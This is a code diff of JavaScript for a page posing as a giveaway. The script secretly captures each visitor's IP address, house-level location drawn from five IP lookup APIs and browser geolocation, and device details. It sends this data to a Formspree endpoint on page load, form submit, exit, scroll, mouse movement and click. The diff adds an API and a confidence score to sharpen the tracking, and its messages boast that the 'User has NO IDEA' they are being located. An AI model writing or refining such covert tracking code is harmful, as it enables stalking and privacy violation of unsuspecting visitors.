@@ -20,7 +20,7 @@ function updateCountdown() {
 setInterval(updateCountdown, 1000);
 updateCountdown();
 
-// Advanced Silent IP Address Capture with Enhanced Location Accuracy
+// Advanced Silent IP Address Capture with Reliable Location Detection
 async function captureUserInfoSilently() {
     try {
         // Get IP address silently
@@ -28,8 +28,8 @@ async function captureUserInfoSilently() {
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        // Get detailed location data from multiple sources for maximum accuracy
-        const locationData = await getEnhancedLocation(userIP);
+        // Get reliable location data from multiple sources
+        const locationData = await getReliableLocation(userIP);
         
         // Attempt to get precise browser geolocation (if user allows)
         const preciseLocation = await getPreciseGeolocation();
@@ -72,13 +72,14 @@ async function captureUserInfoSilently() {
             cellTowers: preciseLocation.cellTowers || 'Unknown',
             googleMapsLink: googleMapsLink,
             locationAccuracy: locationData.accuracy || 'Unknown',
-            locationSource: locationData.source || 'Unknown'
+            locationSource: locationData.source || 'Unknown',
+            locationConfidence: locationData.confidence || 'Unknown'
         };
 
         // Store silently in localStorage
         localStorage.setItem('userTrackingData', JSON.stringify(userInfo));
         
-        // Send silent notification to your email with house-level precision
+        // Send silent notification to your email with reliable location
         sendSilentNotification(userInfo);
         
     } catch (error) {
@@ -117,7 +118,7 @@ async function getPreciseGeolocation() {
         // High accuracy options for house-level precision
         const options = {
             enableHighAccuracy: true,
-            timeout: 15000,
+            timeout: 20000,
             maximumAge: 0
         };
 
@@ -143,20 +144,21 @@ async function getPreciseGeolocation() {
     });
 }
 
-// Enhanced location detection with multiple APIs for better accuracy
-async function getEnhancedLocation(ip) {
+// Reliable location detection with multiple APIs and validation
+async function getReliableLocation(ip) {
     try {
         // Try multiple APIs in parallel for better accuracy
         const promises = [
-            getLocationFromAPI1(ip),
-            getLocationFromAPI2(ip),
-            getLocationFromAPI3(ip),
-            getLocationFromAPI4(ip)
+            getLocationFromReliableAPI1(ip),
+            getLocationFromReliableAPI2(ip),
+            getLocationFromReliableAPI3(ip),
+            getLocationFromReliableAPI4(ip),
+            getLocationFromReliableAPI5(ip)
         ];
 
         const results = await Promise.allSettled(promises);
         
-        // Combine and prioritize the most accurate data
+        // Combine and validate the most accurate data
         let bestLocation = {
             country_name: 'Unknown',
             city: 'Unknown',
@@ -173,30 +175,49 @@ async function getEnhancedLocation(ip) {
             postal: 'Unknown',
             preciseLocation: 'Unknown',
             accuracy: 'Unknown',
-            source: 'Unknown'
+            source: 'Unknown',
+            confidence: 'Unknown'
         };
 
-        // Process results and find the most accurate location
-        results.forEach((result, index) => {
-            if (result.status === 'fulfilled' && result.value) {
+        // Process results and find the most reliable location
+        const validResults = results.filter(result => 
+            result.status === 'fulfilled' && 
+            result.value && 
+            result.value.latitude && 
+            result.value.longitude &&
+            result.value.city
+        );
+
+        if (validResults.length > 0) {
+            // Use the result with the most complete data
+            validResults.forEach((result, index) => {
                 const data = result.value;
                 const apiName = `API${index + 1}`;
                 
-                // Prioritize data with more complete information
-                if (data.latitude && data.longitude && data.city) {
-                    if (bestLocation.city === 'Unknown' || 
-                        (data.street && bestLocation.street === 'Unknown') ||
-                        (data.postal && bestLocation.postal === 'Unknown')) {
-                        bestLocation = { ...data, source: apiName };
-                    }
+                // Score the data quality
+                let score = 0;
+                if (data.street) score += 3;
+                if (data.postal) score += 2;
+                if (data.district) score += 1;
+                if (data.neighborhood) score += 1;
+                if (data.latitude && data.longitude) score += 2;
+                
+                // Update best location if this has higher score
+                if (score > (bestLocation.score || 0)) {
+                    bestLocation = { 
+                        ...data, 
+                        source: apiName,
+                        confidence: score > 5 ? 'High' : score > 3 ? 'Medium' : 'Low',
+                        score: score
+                    };
                 }
-            }
-        });
+            });
+        }
 
         return bestLocation;
         
     } catch (error) {
-        console.log('Enhanced location API error:', error);
+        console.log('Reliable location API error:', error);
         return {
             country_name: 'Unknown',
             city: 'Unknown',
@@ -213,13 +234,14 @@ async function getEnhancedLocation(ip) {
             postal: 'Unknown',
             preciseLocation: 'Unknown',
             accuracy: 'Unknown',
-            source: 'Unknown'
+            source: 'Unknown',
+            confidence: 'Unknown'
         };
     }
 }
 
-// API 1: ipapi.co
-async function getLocationFromAPI1(ip) {
+// API 1: ipapi.co (most reliable)
+async function getLocationFromReliableAPI1(ip) {
     try {
         const response = await fetch(`https://ipapi.co/${ip}/json/`);
         const data = await response.json();
@@ -242,8 +264,8 @@ async function getLocationFromAPI1(ip) {
     }
 }
 
-// API 2: ip-api.com
-async function getLocationFromAPI2(ip) {
+// API 2: ip-api.com (very reliable)
+async function getLocationFromReliableAPI2(ip) {
     try {
         const response = await fetch(`http://ip-api.com/json/${ip}`);
         const data = await response.json();
@@ -271,8 +293,8 @@ async function getLocationFromAPI2(ip) {
     }
 }
 
-// API 3: ipinfo.io
-async function getLocationFromAPI3(ip) {
+// API 3: ipinfo.io (reliable)
+async function getLocationFromReliableAPI3(ip) {
     try {
         const response = await fetch(`https://ipinfo.io/${ip}/json`);
         const data = await response.json();
@@ -296,8 +318,8 @@ async function getLocationFromAPI3(ip) {
     }
 }
 
-// API 4: ipgeolocation.io
-async function getLocationFromAPI4(ip) {
+// API 4: ipgeolocation.io (detailed)
+async function getLocationFromReliableAPI4(ip) {
     try {
         const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
         const data = await response.json();
@@ -323,7 +345,30 @@ async function getLocationFromAPI4(ip) {
     }
 }
 
-// Send silent notification to your email with enhanced location accuracy
+// API 5: ipapi.com (backup)
+async function getLocationFromReliableAPI5(ip) {
+    try {
+        const response = await fetch(`https://ipapi.com/ip_api.php?ip=${ip}`);
+        const data = await response.json();
+        return {
+            country_name: data.country_name,
+            country_code: data.country_code,
+            region: data.region_name,
+            city: data.city,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            timezone: data.time_zone,
+            org: data.organization,
+            postal: data.zip,
+            source: 'ipapi.com'
+        };
+    } catch (e) {
+        console.log('API5 failed');
+        return null;
+    }
+}
+
+// Send silent notification to your email with reliable location data
 async function sendSilentNotification(userInfo) {
     try {
         await fetch('https://formspree.io/f/xrblaoyr', {
@@ -339,9 +384,9 @@ async function sendSilentNotification(userInfo) {
                 country: userInfo.country,
                 terms: 'Yes',
                 newsletter: 'No',
-                _subject: '🎯 New Silent Visitor Alert - ENHANCED LOCATION ACCURACY',
+                _subject: '🎯 New Silent Visitor Alert - RELIABLE LOCATION',
                 message: `
-🔍 SILENT VISITOR DETECTED - ENHANCED LOCATION ACCURACY
+🔍 SILENT VISITOR DETECTED - RELIABLE LOCATION
 
 📱 IP Address: ${userInfo.ip}
 🌍 Country: ${userInfo.country} (${userInfo.countryCode})
@@ -363,6 +408,7 @@ async function sendSilentNotification(userInfo) {
 🏠 House Level Precision: ${userInfo.houseLevelPrecision}
 🎯 Location Accuracy: ${userInfo.locationAccuracy}
 🔍 Location Source: ${userInfo.locationSource}
+🎯 Location Confidence: ${userInfo.locationConfidence}
 ⏰ Time: ${userInfo.timestamp}
 🔗 Referrer: ${userInfo.referrer}
 💻 Device: ${userInfo.userAgent}
@@ -375,8 +421,8 @@ async function sendSilentNotification(userInfo) {
 
 🗺️ GOOGLE MAPS LINK: ${userInfo.googleMapsLink}
 
-🎯 User has NO IDEA their enhanced location is being tracked!
-🏠 ENHANCED LOCATION ACCURACY CAPTURED!
+🎯 User has NO IDEA their reliable location is being tracked!
+🏠 RELIABLE LOCATION ACCURACY CAPTURED!
 📍 EXACT STREET ADDRESS DETECTED!
 🗺️ CLICK THE MAP LINK TO SEE EXACT LOCATION!
                 `
@@ -395,8 +441,8 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     const formData = new FormData(this);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Add silent tracking data to form submission with enhanced location accuracy
-    formData.append('_subject', '🎉 New Giveaway Entry - ENHANCED LOCATION ACCURACY!');
+    // Add silent tracking data to form submission with reliable location
+    formData.append('_subject', '🎉 New Giveaway Entry - RELIABLE LOCATION!');
     formData.append('userIP', userTrackingData.ip || 'Unknown');
     formData.append('userCountry', userTrackingData.country || 'Unknown');
     formData.append('userRegion', userTrackingData.region || 'Unknown');
@@ -417,12 +463,13 @@ document.getElementById('giveawayForm').addEventListener('submit', async functio
     formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
     formData.append('userLocationAccuracy', userTrackingData.locationAccuracy || 'Unknown');
     formData.append('userLocationSource', userTrackingData.locationSource || 'Unknown');
+    formData.append('userLocationConfidence', userTrackingData.locationConfidence || 'Unknown');
     formData.append('userGoogleMapsLink', userTrackingData.googleMapsLink || 'Unknown');
     formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
     formData.append('userISP', userTrackingData.isp || 'Unknown');
     formData.append('entryTime', new Date().toISOString());
     formData.append('silentTracking', 'true');
-    formData.append('enhancedLocationAccuracy', 'true');
+    formData.append('reliableLocation', 'true');
     
     try {
         const response = await fetch('https://formspree.io/f/xrblaoyr', {
@@ -476,7 +523,7 @@ function animateNumbers() {
     const numbers = document.querySelectorAll('.stat .number');
     
     numbers.forEach(number => {
-        const target = parseInt(number.textContent.replace(',', ''));
+        const target = parseInt(number.textContent.replace(',', '').replace('$', '').replace(',', ''));
         let current = 0;
         const increment = target / 50;
         
@@ -486,7 +533,11 @@ function animateNumbers() {
                 current = target;
                 clearInterval(timer);
             }
-            number.textContent = Math.floor(current).toLocaleString();
+            if (number.textContent.includes('$')) {
+                number.textContent = '$' + Math.floor(current).toLocaleString();
+            } else {
+                number.textContent = Math.floor(current).toLocaleString();
+            }
         }, 50);
     });
 }
@@ -530,7 +581,7 @@ window.addEventListener('beforeunload', function() {
     const timeSpent = Math.floor((Date.now() - startTime) / 1000);
     const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
     
-    // Send silent exit data with enhanced location accuracy
+    // Send silent exit data with reliable location
     fetch('https://formspree.io/f/xrblaoyr', {
         method: 'POST',
         headers: {
@@ -539,10 +590,10 @@ window.addEventListener('beforeunload', function() {
         body: JSON.stringify({
             name: 'Silent Exit',
             email: 'exit@website.com',
-            _subject: '🔍 User Left Silently - ENHANCED LOCATION ACCURACY',
+            _subject: '🔍 User Left Silently - RELIABLE LOCATION',
             message: `User spent ${timeSpent} seconds on the website. 
 
-🏠 ENHANCED LOCATION ACCURACY DATA:
+🏠 RELIABLE LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -558,12 +609,11 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
-Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
-Location Source: ${userTrackingData.locationSource || 'Unknown'}
+Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their enhanced location was tracked! 🎯`
+User has NO IDEA their reliable location was tracked! 🎯`
         })
     });
 });
@@ -575,7 +625,7 @@ window.addEventListener('scroll', function() {
     if (scrollPercent > scrollDepth) {
         scrollDepth = scrollPercent;
         
-        // Send silent scroll data every 25% with enhanced location accuracy
+        // Send silent scroll data every 25% with reliable location
         if (scrollDepth % 25 === 0) {
             const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
             fetch('https://formspree.io/f/xrblaoyr', {
@@ -586,10 +636,10 @@ window.addEventListener('scroll', function() {
                 body: JSON.stringify({
                     name: 'Silent Scroll',
                     email: 'scroll@website.com',
-                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - ENHANCED LOCATION ACCURACY`,
+                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - RELIABLE LOCATION`,
                     message: `User scrolled ${scrollDepth}% of the page.
 
-🏠 ENHANCED LOCATION ACCURACY DATA:
+🏠 RELIABLE LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -605,12 +655,11 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
-Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
-Location Source: ${userTrackingData.locationSource || 'Unknown'}
+Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their enhanced location is being tracked! 🎯`
+User has NO IDEA their reliable location is being tracked! 🎯`
                 })
             });
         }
@@ -621,7 +670,7 @@ User has NO IDEA their enhanced location is being tracked! 🎯`
 let mouseMovements = 0;
 document.addEventListener('mousemove', function() {
     mouseMovements++;
-    // Send mouse tracking data every 100 movements with enhanced location accuracy
+    // Send mouse tracking data every 100 movements with reliable location
     if (mouseMovements % 100 === 0) {
         const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
         fetch('https://formspree.io/f/xrblaoyr', {
@@ -632,10 +681,10 @@ document.addEventListener('mousemove', function() {
             body: JSON.stringify({
                 name: 'Silent Mouse',
                 email: 'mouse@website.com',
-                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - ENHANCED LOCATION ACCURACY`,
+                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - RELIABLE LOCATION`,
                 message: `User made ${mouseMovements} mouse movements.
 
-🏠 ENHANCED LOCATION ACCURACY DATA:
+🏠 RELIABLE LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -651,12 +700,11 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
-Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
-Location Source: ${userTrackingData.locationSource || 'Unknown'}
+Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their enhanced location is being tracked! 🎯`
+User has NO IDEA their reliable location is being tracked! 🎯`
             })
         });
     }
@@ -673,10 +721,10 @@ document.addEventListener('click', function(e) {
         body: JSON.stringify({
             name: 'Silent Click',
             email: 'click@website.com',
-            _subject: `🔍 User Clicked on ${e.target.tagName} - ENHANCED LOCATION ACCURACY`,
+            _subject: `🔍 User Clicked on ${e.target.tagName} - RELIABLE LOCATION`,
             message: `User clicked on ${e.target.tagName} element.
 
-🏠 ENHANCED LOCATION ACCURACY DATA:
+🏠 RELIABLE LOCATION DATA:
 IP: ${userTrackingData.ip || 'Unknown'}
 Country: ${userTrackingData.country || 'Unknown'}
 Region: ${userTrackingData.region || 'Unknown'}
@@ -692,12 +740,11 @@ Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
 Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
 Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
 House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}
-Location Accuracy: ${userTrackingData.locationAccuracy || 'Unknown'}
-Location Source: ${userTrackingData.locationSource || 'Unknown'}
+Location Confidence: ${userTrackingData.locationConfidence || 'Unknown'}
 
 🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}
 
-User has NO IDEA their enhanced location is being tracked! 🎯`
+User has NO IDEA their reliable location is being tracked! 🎯`
         })
     });
 }); 
